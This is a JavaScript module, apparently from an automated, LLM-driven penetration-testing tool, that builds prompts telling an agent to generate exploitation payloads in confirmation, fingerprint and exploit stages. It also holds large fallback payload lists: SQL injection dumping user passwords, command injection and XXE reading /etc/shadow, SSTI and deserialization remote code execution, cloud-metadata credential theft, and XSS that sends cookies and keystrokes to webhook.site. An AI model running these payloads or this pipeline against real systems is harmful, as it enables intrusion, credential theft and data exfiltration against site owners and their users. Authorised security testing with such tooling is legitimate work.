/**
 * LLM-assisted intelligent payload generator (utility mode)
 * Provides context-aware payload guidance, templates, and validation
 * to the main executor agent — no separate LLM calls needed.
 *
 * Implements:
 * - Technology-specific payload templates for all vuln types
 * - 3-stage testing guidance (confirmation, fingerprint, exploit)
 * - Anti-hallucination payload validation
 * - Fallback payloads when LLM output is unusable
 */
export class PayloadGenerator {
  /**
   * @param {string} [model='gpt-4o'] - Model identifier (for prompt tuning)
   */
  constructor(model = 'gpt-4o') {
    this.model = model;
  }

  /**
   * Generate structured payload context for the LLM agent.
   * Instead of calling the LLM ourselves, we return rich context
   * that the executor injects into the main conversation so the
   * LLM can craft better payloads without extra API calls.
   *
   * @param {object} vulnerability - Vulnerability from the queue
   * @param {object} context - Intelligence context (DB, WAF, framework, …)
   * @param {string} stage - Testing stage: confirmation | fingerprint | exploit
   * @param {Array|null} previousResults - Results from prior attempts
   * @returns {object} Structured payload context for the LLM
   */
  generatePayloadContext(vulnerability, context, stage = 'confirmation', previousResults = null) {
    const vulnType = vulnerability.vulnerabilityType || vulnerability.type || 'other';

    return {
      systemGuidance: this.getSystemPrompt(vulnType),
      stageInstructions: this.getStageInstructions(stage, vulnType),
      technologyContext: this.buildPrompt(vulnerability, context, stage, previousResults),
      fallbackPayloads: this.getFallbackPayloads(vulnType, stage),
      vulnType,
      stage
    };
  }

  /**
   * Validate and filter payloads produced by the LLM.
   * Call this on the raw LLM output to strip hallucinated / placeholder content.
   *
   * @param {string} rawResponse - Raw text from the LLM containing payloads
   * @returns {Array<string>} Validated payload strings
   */
  validateAndFilter(rawResponse) {
    const payloads = this.parsePayloadsFromResponse(rawResponse);
    return payloads;
  }

  // ---------------------------------------------------------------------------
  // Prompt construction
  // ---------------------------------------------------------------------------

  /**
   * Build context-aware prompt for payload generation
   * @param {object} vulnerability
   * @param {object} context
   * @param {string} stage
   * @param {Array|null} previousResults
   * @returns {string}
   * @private
   */
  buildPrompt(vulnerability, context, stage, previousResults) {
    let prompt = `Generate ${stage} payloads for the following vulnerability:\n\n`;

    // Vulnerability details
    prompt += `**Vulnerability Details:**\n`;
    prompt += `- Type: ${vulnerability.vulnerabilityType || vulnerability.type}\n`;
    prompt += `- Location: ${vulnerability.source || vulnerability.location}\n`;
    prompt += `- File: ${vulnerability.file || 'unknown'}\n`;
    prompt += `- Line: ${vulnerability.line || 'unknown'}\n`;
    prompt += `- Sink: ${vulnerability.sink_call || 'unknown'}\n`;
    if (vulnerability.witnessPayload) {
      prompt += `- Witness Payload (from static analysis): ${vulnerability.witnessPayload}\n`;
    }
    if (vulnerability.snippet) {
      prompt += `- Code Snippet:\n\`\`\`\n${vulnerability.snippet}\n\`\`\`\n`;
    }
    if (vulnerability.cwe) {
      prompt += `- CWE: ${vulnerability.cwe}\n`;
    }
    if (vulnerability.description) {
      prompt += `- Description: ${vulnerability.description}\n`;
    }
    prompt += `\n`;

    // Technology context
    if (context.database) {
      prompt += `**Database:** ${context.database}\n`;
    }
    if (context.os) {
      prompt += `**Operating System:** ${context.os}\n`;
    }
    if (context.framework) {
      prompt += `**Framework:** ${context.framework}\n`;
    }
    if (context.language) {
      prompt += `**Language:** ${context.language}\n`;
    }
    if (context.architecture) {
      prompt += `**Architecture:** ${context.architecture}\n`;
    }
    prompt += `\n`;

    // Code context
    if (context.codeSnippet) {
      prompt += `**Vulnerable Code:**\n\`\`\`\n${context.codeSnippet}\n\`\`\`\n\n`;
    }

    // Query structure
    if (context.queryStructure) {
      prompt += `**Query Structure:** ${context.queryStructure}\n\n`;
    }

    // WAF information
    if (context.waf) {
      prompt += `**WAF Detected:** ${context.waf}\n`;
      prompt += `**WAF Bypass Needed:** Yes\n\n`;
    }

    // Authentication context
    if (context.authentication) {
      prompt += `**Authentication:** ${context.authentication}\n\n`;
    }

    // Endpoints
    if (context.endpoints && context.endpoints.length > 0) {
      prompt += `**Known Endpoints:** ${context.endpoints.join(', ')}\n\n`;
    }

    // Previous results for refinement
    if (previousResults && previousResults.length > 0) {
      prompt += `**Previous Attempts:**\n`;
      for (const result of previousResults.slice(-5)) {
        prompt += `- Payload: ${result.payload}\n`;
        prompt += `  Result: ${result.success ? 'SUCCESS' : 'FAILED'}\n`;
        if (result.error) {
          prompt += `  Error: ${result.error}\n`;
        }
        if (result.response) {
          prompt += `  Response: ${String(result.response).substring(0, 150)}...\n`;
        }
      }
      prompt += `\n`;
    }

    // Stage-specific instructions
    prompt += this.getStageInstructions(stage, vulnerability.vulnerabilityType || vulnerability.type);

    return prompt;
  }

  /**
   * Get system prompt for vulnerability type
   * @param {string} vulnType
   * @returns {string}
   * @private
   */
  getSystemPrompt(vulnType) {
    const basePrompt = `You are an expert security researcher specializing in ${vulnType} vulnerabilities. Generate effective, context-aware exploitation payloads based on the provided intelligence.

Your responses should:
1. Consider the specific technology stack (database, OS, framework)
2. Use appropriate syntax for the environment
3. Start simple and escalate in complexity
4. Include encoding/bypass techniques if WAF is present
5. Return ONLY the payloads, one per line, without explanations

Format your response as a numbered list of payloads, like:
1. payload_here
2. another_payload
3. third_payload`;

    const typeAdditions = this._getTypeSpecificPromptAddition(vulnType);
    return basePrompt + (typeAdditions || '');
  }

  /**
   * @private
   */
  _getTypeSpecificPromptAddition(vulnType) {
    const additions = {
      injection: `\n\nFor SQL injection:
- Use database-specific syntax (MySQL vs PostgreSQL vs MSSQL vs SQLite)
- Start with error-based, then boolean-blind, then time-based
- Include UNION SELECT for data extraction
- Consider comment terminators (-- vs # vs /* */)
- Use appropriate string delimiters (' vs ")`,

      command_injection: `\n\nFor Command Injection:
- Use OS-appropriate separators (; | & \` $())
- Start with harmless commands (id, whoami, hostname)
- Try different shells (sh, bash, cmd, powershell)
- Include blind techniques (sleep, ping)
- Try backtick and $() substitution`,

      xss: `\n\nFor XSS:
- Start with basic tags, then event handlers
- Consider context (HTML, JavaScript, attribute, URL)
- Include encoding variations (HTML entities, URL encoding, Unicode)
- Test both reflected and stored scenarios
- Try framework-specific payloads (Angular, React, Vue)`,

      ssrf: `\n\nFor SSRF:
- Target metadata endpoints (169.254.169.254)
- Try protocol variations (http, file, gopher, dict)
- Include localhost variations (127.0.0.1, [::1], localhost, 0.0.0.0)
- Consider DNS rebinding if needed
- Try URL encoding and IP obfuscation`,

      ssti: `\n\nFor SSTI:
- Use template engine-specific syntax (Jinja2, Twig, Freemarker, Pebble, Velocity)
- Start with basic expressions ({{7*7}}, \${7*7}, #{7*7})
- Escalate to RCE if possible
- Include sandbox escape techniques
- Try polyglot payloads that work across engines`,

      traversal: `\n\nFor Path Traversal:
- Use OS-appropriate separators (/ for Linux, \\ for Windows)
- Start with ../ chains of increasing depth
- Try encoding variations (%2e%2e%2f, ..%252f, ....//....//
- Target known files (/etc/passwd, /etc/hostname, C:\\windows\\win.ini)
- Try null byte injection (%00) for older systems
- Include application files (../package.json, ../app.js)`,

      xxe: `\n\nFor XXE:
- Start with basic entity declaration (<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>)
- Try parameter entities for blind XXE
- Consider different parsers (libxml2, expat, Java SAX)
- Include SVG-based XXE vectors
- Test both in-band and out-of-band techniques`,

      redirect: `\n\nFor Open Redirect:
- Start with absolute URLs (https://evil.com)
- Try protocol-relative URLs (//evil.com)
- Include backslash tricks (/\\evil.com)
- Test whitelist bypasses (@evil.com, .evil.com, ?allowed)
- Try URL encoding and double encoding
- Include CRLF injection (%0d%0aLocation: https://evil.com)`,

      auth: `\n\nFor Authentication Bypass:
- Test default credentials (admin/admin, admin/password)
- Try parameter manipulation (isAdmin=true, role=admin)
- Check for JWT vulnerabilities (none algorithm, weak secret)
- Test session fixation and cookie manipulation
- Check for IDOR in user endpoints`,

      secrets: `\n\nFor Secret Validation:
- Check if credentials found in source are still valid
- Test API keys against known endpoints
- Look for exposed secrets in client-side JavaScript bundles
- Check .env, config files, source maps
- Verify JWT secrets allow token forging`,

      deserialization: `\n\nFor Deserialization:
- Use language-specific gadget chains
- PHP: O:8:"stdClass":0:{}, phar:// wrappers
- Java: ysoserial payloads, Commons Collections
- Python: pickle payloads
- Node.js: node-serialize exploits
- .NET: TypeNameHandling payloads`,

      config: `\n\nFor Configuration Issues:
- Check for debug endpoints (/debug, /actuator, /metrics)
- Test for exposed admin panels
- Check security headers (CSP, HSTS, X-Frame-Options)
- Verify CORS configuration
- Test for verbose error messages`,

      crypto: `\n\nFor Cryptographic Issues:
- Test for weak algorithms (MD5, SHA1, DES)
- Check for hardcoded keys/IVs
- Verify proper random number generation
- Test for padding oracle vulnerabilities
- Check TLS configuration`
    };

    return additions[vulnType] || '';
  }

  /**
   * Get stage-specific instructions
   * @param {string} stage
   * @param {string} vulnType
   * @returns {string}
   * @private
   */
  getStageInstructions(stage, vulnType) {
    const instructions = {
      confirmation: {
        injection: `Generate 3-5 payloads to CONFIRM SQL injection exists:
- Error-inducing characters (' " ; --)
- Simple boolean conditions (1=1 vs 1=2)
- Time delay (SLEEP, WAITFOR, pg_sleep)
Goal: Detect if input reaches the SQL query (not exploit yet)`,

        command_injection: `Generate 3-5 payloads to CONFIRM command injection exists:
- Command separators (; | & || &&)
- Inline execution (\`id\`, $(whoami))
- Time-based detection (sleep 5, ping -c 5 127.0.0.1)
Goal: Detect if input reaches the OS command interpreter`,

        xss: `Generate 3-5 payloads to CONFIRM XSS exists:
- Basic script tags (<script>alert(1)</script>)
- Event handlers (<img src=x onerror=alert(1)>)
- SVG/body onload (<svg onload=alert(1)>)
Goal: Detect if XSS is possible (payload reflects/executes)`,

        ssrf: `Generate 3-5 payloads to CONFIRM SSRF exists:
- Metadata endpoint requests (http://169.254.169.254/)
- Localhost probing (http://127.0.0.1/, http://[::1]/)
- Internal IP ranges (http://10.0.0.1/, http://192.168.1.1/)
Goal: Detect if URL is followed server-side`,

        ssti: `Generate 3-5 payloads to CONFIRM SSTI exists:
- Math expressions: {{7*7}}, \${7*7}, #{7*7}, <%= 7*7 %>
- String operations: {{'a'*5}}, \${'a'.repeat(5)}
- Polyglot: {{7*'7'}}
Goal: Detect if template expressions are evaluated`,

        traversal: `Generate 3-5 payloads to CONFIRM path traversal exists:
- Basic traversal: ../../../etc/passwd
- Encoded: ..%2f..%2f..%2fetc/passwd
- Double-encoded: ..%252f..%252f..%252fetc/passwd
- Dotdot-slash variations: ....//....//etc/passwd
Goal: Detect if path traversal reaches the filesystem`,

        xxe: `Generate 3-5 payloads to CONFIRM XXE exists:
- Basic entity: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
- Parameter entity: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname">]>
- Error-based: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]>
Goal: Detect if XML entity processing is enabled`,

        redirect: `Generate 3-5 payloads to CONFIRM open redirect exists:
- Absolute URL: https://evil.com
- Protocol-relative: //evil.com
- Backslash trick: /\\evil.com
- URL-encoded: %2f%2fevil.com
Goal: Detect if redirect parameter is followed`,

        auth: `Generate 3-5 payloads to CONFIRM auth bypass exists:
- Default credentials: admin/admin, admin/password
- Empty password: admin/
- Parameter manipulation: role=admin, isAdmin=true
Goal: Detect if authentication can be bypassed`,

        secrets: `Generate 3-5 payloads to CONFIRM secret exposure:
- Check client bundles for hardcoded values
- Test found credentials against login endpoints
- Check API key validity against API endpoints
Goal: Determine if exposed secrets are valid/usable`,

        deserialization: `Generate 3-5 payloads to CONFIRM deserialization vulnerability:
- Language-specific markers (PHP serialize, Java base64)
- Type confusion payloads
- Simple gadget chains
Goal: Detect if untrusted data is deserialized`,

        config: `Generate 3-5 tests to CONFIRM configuration issues:
- Check debug endpoints (/debug, /actuator, /metrics, /_debug)
- Check security headers in responses
- Test CORS with Origin header manipulation
Goal: Detect misconfiguration`,

        crypto: `Generate 3-5 tests to CONFIRM cryptographic issues:
- Check for weak hashing in responses
- Test for algorithm downgrade
- Check certificate/TLS configuration
Goal: Detect cryptographic weakness`
      },

      fingerprint: {
        injection: `Generate payloads to FINGERPRINT the database:
- Extract database version (@@version, version(), banner)
- Identify current user (user(), current_user, system_user)
- List databases (information_schema.schemata, pg_database)
- Determine column count (ORDER BY N)
Use UNION SELECT or error-based extraction`,

        command_injection: `Generate payloads to FINGERPRINT the environment:
- OS identification (uname -a, ver, systeminfo)
- Current user (id, whoami)
- Network info (ifconfig, ipconfig, hostname)
- Process list (ps aux, tasklist)`,

        xss: `Generate payloads to FINGERPRINT the XSS context:
- Determine execution context (HTML/JS/attribute)
- Test available functions (alert, console.log, fetch)
- Check for CSP (try inline vs eval vs external)
- Detect sanitization patterns (what gets stripped)`,

        ssrf: `Generate payloads to FINGERPRINT internal network:
- Scan common internal IPs and ports
- Check for cloud metadata services
- Identify internal services (databases, caches, admin panels)
- Enumerate DNS resolution`,

        ssti: `Generate payloads to FINGERPRINT the template engine:
- Identify engine: {{config}}, \${T(java.lang.Runtime)}, #{7*7}
- Check sandbox restrictions
- Enumerate available classes/modules
- Test object traversal depth`,

        traversal: `Generate payloads to FINGERPRINT the filesystem:
- Read system info (/etc/hostname, /proc/version)
- Identify web root (../../../var/www/html/, ../../app/)
- Find configuration files (../config.json, ../.env)
- Check permissions (sensitive vs public files)`,

        xxe: `Generate payloads to FINGERPRINT the environment:
- Read system files (/etc/hostname, /etc/os-release)
- Identify application paths
- Check for outbound connectivity (blind XXE)
- Test entity expansion limits`,

        redirect: `Generate payloads to FINGERPRINT redirect validation:
- Test different URL schemes (javascript:, data:, ftp:)
- Check domain validation patterns
- Test subdomain matching
- Identify allowed redirect destinations`,

        auth: `Generate payloads to FINGERPRINT authentication:
- Enumerate valid usernames
- Test password policy
- Check session management (timeout, rotation)
- Identify auth token format (JWT, session, API key)`,

        secrets: `Validate discovered secrets:
- Test each credential against all auth endpoints
- Check API key scopes and permissions
- Verify token validity and expiration
- Identify what resources are accessible`,

        deserialization: `Generate payloads to FINGERPRINT the deserializer:
- Identify serialization format (PHP, Java, Python pickle)
- Test available gadget chains
- Check class availability
- Test sandbox restrictions`,

        config: `Test configuration in depth:
- Enumerate all debug/admin endpoints
- Check for information disclosure
- Test CORS with various origins
- Identify framework version from headers/errors`,

        crypto: `Analyze cryptographic implementation:
- Identify algorithms in use
- Check key lengths
- Test for timing side-channels
- Verify randomness sources`
      },

      exploit: {
        injection: `Generate payloads to EXTRACT DATA:
- Retrieve user table data (UNION SELECT username, password FROM users)
- Extract sensitive information (credentials, tokens, PII)
- Dump first 5 rows from target tables
- Read files if possible (LOAD_FILE, pg_read_file)
Use UNION SELECT with specific table/column names from fingerprinting`,

        command_injection: `Generate payloads to DEMONSTRATE IMPACT:
- Read sensitive files (cat /etc/shadow, type C:\\Users\\*)
- Establish proof of execution (write a marker file)
- Check for privilege escalation paths
- Demonstrate network access`,

        xss: `Generate payloads to DEMONSTRATE IMPACT:
- Cookie theft (document.cookie exfiltration)
- Session hijacking (token extraction)
- Keylogging (input event listeners)
- DOM manipulation (defacement proof)`,

        ssrf: `Generate payloads to DEMONSTRATE IMPACT:
- Access sensitive internal endpoints
- Read cloud credentials (IAM, metadata)
- Access internal databases/caches
- Scan internal network infrastructure`,

        ssti: `Generate payloads to DEMONSTRATE IMPACT:
- Execute OS commands through template engine
- Read sensitive files
- Access application internals (config, secrets)
- Demonstrate code execution`,

        traversal: `Generate payloads to DEMONSTRATE IMPACT:
- Read sensitive files (/etc/shadow, application configs)
- Access source code (../app.js, ../server.py)
- Read environment files (../.env, ../config/database.yml)
- Access credentials (../config/secrets.json)`,

        xxe: `Generate payloads to DEMONSTRATE IMPACT:
- Read sensitive system files (/etc/shadow, application configs)
- Access source code via file:// protocol
- Perform SSRF through XXE
- Exfiltrate data via out-of-band channel`,

        redirect: `Generate payloads to DEMONSTRATE IMPACT:
- Craft convincing phishing redirects
- Chain with XSS (javascript: URI)
- Bypass OAuth flow (redirect_uri manipulation)
- Steal tokens via redirect`,

        auth: `Generate payloads to DEMONSTRATE IMPACT:
- Access admin functionality
- View/modify other users' data
- Escalate privileges
- Bypass authorization checks`,

        secrets: `Demonstrate impact of exposed secrets:
- Access protected resources with found credentials
- Enumerate data accessible with API keys
- Forge tokens if JWT secret is known
- Show scope of data exposure`,

        deserialization: `Generate payloads to DEMONSTRATE IMPACT:
- Achieve remote code execution
- Read/write files on server
- Establish reverse shell (if applicable)
- Access internal services`,

        config: `Demonstrate impact of misconfiguration:
- Access admin panels or debug info
- Extract sensitive data from endpoints
- Exploit CORS to steal data cross-origin
- Leverage verbose errors for information`,

        crypto: `Demonstrate impact of crypto weakness:
- Forge signatures or tokens
- Decrypt protected data
- Perform padding oracle attack
- Demonstrate algorithm downgrade`
      },

      refinement: {
        _default: `Based on previous test results, generate 3-5 IMPROVED payloads that:
1. Build on any successful patterns
2. Avoid patterns that were blocked or failed
3. Try different encoding if validation is blocking
4. Use alternative bypass techniques if WAF is present
5. Escalate complexity progressively`
      }
    };

    const stageInstructions = instructions[stage];
    if (!stageInstructions) {
      return instructions.refinement._default;
    }

    return stageInstructions[vulnType] ||
           stageInstructions._default ||
           `Generate payloads for ${stage} stage of ${vulnType} testing.`;
  }

  // ---------------------------------------------------------------------------
  // Payload parsing & validation
  // ---------------------------------------------------------------------------

  /**
   * Parse payloads from LLM response with anti-hallucination validation
   * @param {string} response
   * @returns {Array<string>}
   * @private
   */
  parsePayloadsFromResponse(response) {
    const payloads = [];

    // Extract numbered list items
    const numberedPattern = /^\d+\.\s*(.+)$/gm;
    let match;
    while ((match = numberedPattern.exec(response)) !== null) {
      const payload = match[1].trim();
      // Remove markdown code block markers if present
      const cleanPayload = payload.replace(/^`+|`+$/g, '').trim();
      if (cleanPayload) {
        payloads.push(cleanPayload);
      }
    }

    // If no numbered list found, try to extract from code blocks
    if (payloads.length === 0) {
      const codeBlockPattern = /```[\w]*\n([\s\S]+?)\n```/g;
      while ((match = codeBlockPattern.exec(response)) !== null) {
        const lines = match[1].split('\n').filter(line =>
          line.trim() && !line.trim().startsWith('#') && !line.trim().startsWith('//')
        );
        payloads.push(...lines.map(l => l.trim()));
      }
    }

    // If still nothing, extract lines that look like payloads
    if (payloads.length === 0) {
      const lines = response.split('\n');
      for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed &&
            !trimmed.startsWith('#') &&
            !trimmed.startsWith('//') &&
            !trimmed.startsWith('*') &&
            !trimmed.startsWith('-') &&
            trimmed.length > 2 &&
            trimmed.length < 500) {
          payloads.push(trimmed);
        }
      }
    }

    // ANTI-HALLUCINATION: Validate and filter payloads
    const validatedPayloads = this.validatePayloads(payloads);

    return validatedPayloads.slice(0, 15); // Limit to 15 payloads
  }

  /**
   * Validate payloads to filter out hallucinated/placeholder content
   * @param {Array<string>} payloads
   * @returns {Array<string>}
   * @private
   */
  validatePayloads(payloads) {
    // Placeholder patterns that indicate hallucination
    const hallucianationPatterns = [
      /INSERT.*?PAYLOAD.*?HERE/i,
      /REPLACE.*?WITH.*?YOUR/i,
      /YOUR.*?SERVER.*?HERE/i,
      /PUT.*?YOUR.*?HERE/i,
      /CHANGE.*?THIS/i,
      /TODO:/i,
      /FIXME:/i,
      /xxx{3,}/i,
      /^\s*test\s*$/i,
      /^\s*placeholder\s*$/i,
      /^\s*sample\s*$/i,
      /^payload\d*$/i,
      /\{.*?YOUR_.*?\}/i,
      /<YOUR_/i,
      /:YOUR_/i,
      /^\s*N\/A\s*$/i,
      /^\s*none\s*$/i,
      /^\s*null\s*$/i,
      /^\s*undefined\s*$/i
    ];

    const validPayloads = payloads.filter(payload => {
      // Skip very short payloads (likely not real)
      if (payload.length < 1) return false;

      // Skip very long payloads (likely explanations)
      if (payload.length > 1000) return false;

      // Skip if it matches hallucination patterns
      for (const pattern of hallucianationPatterns) {
        if (pattern.test(payload)) {
          return false;
        }
      }

      // Skip if it looks like prose/explanation (high word count + no special chars)
      const wordCount = payload.split(/\s+/).length;
      const hasSpecialChars = /[<>'"`;|&{}()$%\\\/]/.test(payload);
      if (wordCount > 25 && !hasSpecialChars) {
        return false;
      }

      return true;
    });

    return validPayloads;
  }

  // ---------------------------------------------------------------------------
  // Fallback payloads
  // ---------------------------------------------------------------------------

  /**
   * Get fallback payloads when LLM output is insufficient
   * @param {string} vulnType
   * @param {string} stage
   * @returns {Array<string>}
   */
  getFallbackPayloads(vulnType, stage) {
    const fallbacks = {
      injection: {
        confirmation: [
          `'`,
          `"`,
          `' OR '1'='1'--`,
          `' AND '1'='2'--`,
          `'; SELECT SLEEP(5)--`,
          `1; WAITFOR DELAY '0:0:5'--`,
          `' OR 1=1#`
        ],
        fingerprint: [
          `' UNION SELECT @@version--`,
          `' UNION SELECT version()--`,
          `' UNION SELECT user()--`,
          `' UNION SELECT current_user--`,
          `' ORDER BY 1--`,
          `' ORDER BY 5--`,
          `' ORDER BY 10--`
        ],
        exploit: [
          `' UNION SELECT username, password FROM users--`,
          `' UNION SELECT table_name, NULL FROM information_schema.tables--`,
          `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--`,
          `' UNION ALL SELECT NULL, LOAD_FILE('/etc/passwd')--`
        ]
      },

      command_injection: {
        confirmation: [
          `; id`,
          `| whoami`,
          `& whoami`,
          `\`id\``,
          `$(whoami)`,
          `; sleep 5`,
          `| ping -c 5 127.0.0.1`
        ],
        fingerprint: [
          `; uname -a`,
          `; cat /etc/os-release`,
          `; hostname`,
          `; ifconfig`,
          `; env`
        ],
        exploit: [
          `; cat /etc/passwd`,
          `; cat /etc/shadow`,
          `; ls -la /`,
          `; cat /proc/self/environ`
        ]
      },

      xss: {
        confirmation: [
          `<script>alert(1)</script>`,
          `<img src=x onerror=alert(1)>`,
          `<svg onload=alert(1)>`,
          `"><script>alert(1)</script>`,
          `'-alert(1)-'`,
          `<body onload=alert(1)>`
        ],
        fingerprint: [
          `<script>console.log(document.domain)</script>`,
          `<img src=x onerror=console.log(document.cookie)>`,
          `<script>fetch('/api/me')</script>`
        ],
        exploit: [
          `<script>fetch('https://webhook.site/test?c='+document.cookie)</script>`,
          `<script>new Image().src='https://webhook.site/test?c='+document.cookie</script>`,
          `<img src=x onerror="fetch('/api/admin').then(r=>r.text()).then(t=>fetch('https://webhook.site/test?d='+btoa(t)))">`,
          `<script>document.onkeypress=function(e){fetch('https://webhook.site/test?k='+e.key)}</script>`
        ]
      },

      ssrf: {
        confirmation: [
          `http://169.254.169.254/`,
          `http://127.0.0.1/`,
          `http://localhost/`,
          `http://[::1]/`,
          `http://0.0.0.0/`,
          `http://169.254.169.254/latest/meta-data/`
        ],
        fingerprint: [
          `http://169.254.169.254/latest/meta-data/iam/info`,
          `http://169.254.169.254/latest/dynamic/instance-identity/document`,
          `http://127.0.0.1:6379/`,
          `http://127.0.0.1:27017/`,
          `http://127.0.0.1:3306/`
        ],
        exploit: [
          `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
          `http://169.254.169.254/latest/user-data`,
          `file:///etc/passwd`,
          `gopher://127.0.0.1:6379/_INFO`
        ]
      },

      ssti: {
        confirmation: [
          `{{7*7}}`,
          `{{7*'7'}}`,
          `\${7*7}`,
          `<%= 7*7 %>`,
          `#{7*7}`,
          `*{7*7}`,
          `{7*7}`
        ],
        fingerprint: [
          `{{config}}`,
          `{{self.__class__.__mro__}}`,
          `{{request.application.__globals__}}`,
          `{{settings.SECRET_KEY}}`,
          `<%= self.class %>`,
          `\${T(java.lang.System).getenv()}`
        ],
        exploit: [
          `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`,
          `{{''.__class__.__mro__[2].__subclasses__()}}`,
          `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
          `<%= system('id') %>`,
          `\${T(java.lang.Runtime).getRuntime().exec('id')}`
        ]
      },

      traversal: {
        confirmation: [
          `../../../etc/passwd`,
          `....//....//....//etc/passwd`,
          `..%2f..%2f..%2fetc/passwd`,
          `..%252f..%252f..%252fetc/passwd`,
          `/etc/passwd`,
          `..\\..\\..\\windows\\win.ini`
        ],
        fingerprint: [
          `../../../etc/hostname`,
          `../../../etc/os-release`,
          `../../../proc/version`,
          `../package.json`,
          `../.env`,
          `../../app.js`
        ],
        exploit: [
          `../../../etc/shadow`,
          `../../../proc/self/environ`,
          `../../../var/log/auth.log`,
          `../config/database.yml`,
          `../config/secrets.json`,
          `../.git/config`
        ]
      },

      xxe: {
        confirmation: [
          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>`,
          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>`
        ],
        fingerprint: [
          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/os-release">]><foo>&xxe;</foo>`,
          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><foo>&xxe;</foo>`
        ],
        exploit: [
          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>`,
          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>`,
          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; data SYSTEM 'file:///etc/shadow'>">%eval;%data;]><foo>test</foo>`
        ]
      },

      redirect: {
        confirmation: [
          `https://evil.com`,
          `//evil.com`,
          `/\\evil.com`,
          `%2f%2fevil.com`,
          `javascript:alert(document.domain)`
        ],
        fingerprint: [
          `https://allowed.com@evil.com`,
          `https://allowed.com.evil.com`,
          `https://evil.com?allowed.com`,
          `https://evil.com#allowed.com`,
          `data:text/html,<script>alert(1)</script>`
        ],
        exploit: [
          `https://evil.com/phishing-login`,
          `javascript:fetch('/api/admin').then(r=>r.text()).then(alert)`,
          `%0d%0aLocation:%20https://evil.com`,
          `https://evil.com%2f%2fallowed.com`
        ]
      },

      auth: {
        confirmation: [
          `admin:admin`,
          `admin:password`,
          `admin:123456`,
          `test:test`,
          `user:user`
        ],
        fingerprint: [
          `admin' OR '1'='1'--:anything`,
          `{"username":"admin","password":{"$gt":""}}`,
          `admin:admin&role=admin`,
          `admin:admin&isAdmin=true`
        ],
        exploit: [
          `Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.`,
          `Cookie: session=admin`,
          `X-Forwarded-For: 127.0.0.1`
        ]
      },

      secrets: {
        confirmation: [
          `curl -H "Authorization: Bearer <found_token>" /api/me`,
          `curl -H "X-API-Key: <found_key>" /api/status`
        ],
        fingerprint: [
          `/main.js`,
          `/app.js`,
          `/bundle.js`,
          `/.env`,
          `/.git/config`
        ],
        exploit: [
          `Use found credentials to access admin endpoints`,
          `Use found API key to enumerate resources`
        ]
      },

      deserialization: {
        confirmation: [
          `O:8:"stdClass":0:{}`,
          `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==`,
          `cos\nsystem\n(S'id'\ntR.`,
          `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}"}`
        ],
        fingerprint: [
          `O:7:"Example":1:{s:4:"data";s:6:"whoami";}`,
          `a:2:{i:0;s:4:"test";i:1;s:4:"data";}`
        ],
        exploit: [
          `O:7:"Example":1:{s:4:"data";s:10:"phpinfo();";}`,
          `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('cat /etc/passwd')}"}`
        ]
      },

      config: {
        confirmation: [
          `/actuator/health`,
          `/debug`,
          `/_debug`,
          `/metrics`,
          `/swagger.json`,
          `/api-docs`
        ],
        fingerprint: [
          `/actuator/env`,
          `/actuator/configprops`,
          `/.well-known/openid-configuration`,
          `/server-info`
        ],
        exploit: [
          `/actuator/heapdump`,
          `/actuator/threaddump`,
          `/admin`,
          `/.git/HEAD`
        ]
      },

      crypto: {
        confirmation: [
          `Check: md5, sha1 in response headers/bodies`,
          `Test: TLS version negotiation`,
          `Check: Cookie secure/httponly flags`
        ],
        fingerprint: [
          `Analyze: JWT algorithm (RS256, HS256, none)`,
          `Check: Key length in certificates`,
          `Test: HSTS header presence`
        ],
        exploit: [
          `Forge: JWT with none algorithm`,
          `Downgrade: TLS to SSLv3`,
          `Crack: weak hash values`
        ]
      }
    };

    return fallbacks[vulnType]?.[stage] ||
           fallbacks[vulnType]?.confirmation ||
           [`' OR '1'='1'--`, `<script>alert(1)</script>`, `../../../etc/passwd`];
  }
}

/**
 * Create payload generator instance
 * @param {string} [model='gpt-4o'] - Model identifier
 * @returns {PayloadGenerator}
 */
export function createPayloadGenerator(model = 'gpt-4o') {
  return new PayloadGenerator(model);
}
